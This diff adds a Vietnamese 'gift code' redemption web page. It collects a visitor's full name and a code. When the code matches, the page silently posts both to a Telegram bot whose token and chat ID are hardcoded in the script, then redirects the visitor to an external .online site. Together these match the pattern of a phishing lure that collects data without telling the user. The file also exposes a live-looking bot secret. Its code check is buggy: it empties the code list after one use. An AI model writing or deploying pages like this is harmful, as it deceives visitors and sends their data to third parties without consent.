@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Nhập Gift Code</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11">
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+  <style>
+    body {
+      background: linear-gradient(to bottom, #e0f7fa, #fff);
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #000;
+    }
+
+    #giftContainer {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    h2 {
+      color: #007bff;
+    }
+
+    label {
+      display: block;
+      margin: 10px 0;
+      font-size: 18px;
+    }
+
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      box-sizing: border-box;
+      margin-bottom: 10px;
+    }
+
+    button {
+      background-color: #28a745;
+      color: #fff;
+      padding: 10px 20px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #218838;
+    }
+
+    #rewardMessage {
+      display: none;
+      margin-top: 20px;
+      font-size: 20px;
+    }
+
+    #claimRewardButton {
+      display: none;
+      background-color: #007bff;
+      color: #fff;
+      padding: 10px 20px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      margin-top: 20px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    #claimRewardButton:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-md-6">
+        <div id="giftContainer">
+          <h2>Nhập Gift Code</h2>
+          <label for="recipientName">Họ và Tên:</label>
+          <input type="text" id="recipientName" name="recipientName" required>
+          <label for="giftCode">Mật mã:</label>
+          <input type="text" id="giftCode" name="giftCode" required>
+          <br>
+          <button type="button" class="btn btn-success" onclick="claimGift()">Xác nhận</button>
+
+          <div id="rewardMessage">
+            <p>Chúc mừng <span id="recipientNameDisplay"></span> đã nhập đúng mật mã!</p>
+            <button type="button" class="btn btn-primary" id="claimRewardButton" onclick="claimReward()">Nhận Thưởng</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script>
+    var giftCodes = [
+      "123456",
+      "789012",
+      "345678",
+      "901234",
+      "567890",
+      "234567",
+      "890123",
+      "456789",
+      "012345",
+      "678901"
+    ];
+
+    function getRandomGiftCodes() {
+      var randomCodes = [];
+      for (var i = 0; i < 10; i++) {
+        var randomIndex = Math.floor(Math.random() * giftCodes.length);
+        randomCodes.push(giftCodes[randomIndex]);
+        giftCodes.splice(randomIndex, 1);
+      }
+      return randomCodes;
+    }
+
+    function claimGift() {
+      var recipientName = document.getElementById('recipientName').value;
+      var giftCode = document.getElementById('giftCode').value;
+      var isValidGiftCode = checkGiftCode(giftCode);
+
+      if (isValidGiftCode) {
+        showRewardMessage(recipientName);
+        sendToTelegram(recipientName, giftCode);
+      } else {
+        showErrorMessage("Gift code không hợp lệ. Vui lòng thử lại.");
+      }
+    }
+
+    function checkGiftCode(giftCode) {
+      return getRandomGiftCodes().includes(giftCode);
+    }
+
+    function showRewardMessage(recipientName) {
+      Swal.fire({
+        title: 'Thành công!',
+        text: 'Chúc mừng ' + recipientName + ', bạn đã nhập đúng mật mã!',
+        icon: 'success',
+        confirmButtonText: 'Đóng'
+      });
+
+      document.getElementById('recipientNameDisplay').textContent = recipientName;
+      document.getElementById('rewardMessage').style.display = 'block';
+      document.getElementById('claimRewardButton').style.display = 'block';
+    }
+
+    function showErrorMessage(message) {
+      Swal.fire({
+        title: 'Lỗi',
+        text: message,
+        icon: 'error',
+        confirmButtonText: 'Đóng'
+      });
+    }
+
+    function claimReward() {
+      var recipientName = document.getElementById('recipientName').value;
+      var rewardLink = 'https://www.sonlyhongduc.online';
+      window.location.href = rewardLink;
+    }
+
+    function sendToTelegram(recipientName, giftCode) {
+      var message = 'Người nhận: ' + recipientName + '\nGift Code: ' + giftCode;
+      var telegramBotToken = '5568011506:AAEu39ys7J7I8J9fEyd5tBwzzabxxzJhvqc';
+      var telegramChatId = '-1002042330395';
+      var apiUrl = 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage';
+
+      axios.post(apiUrl, {
+        chat_id: telegramChatId,
+        text: message,
+      })
+      .then(function (response) {
+        console.log('Thông tin đã được gửi đến Telegram:', response.data);
+      })
+      .catch(function (error) {
+        console.error('Lỗi khi gửi thông tin đến Telegram:', error);
+      });
+    }
+  </script>
+</body>
+</html>
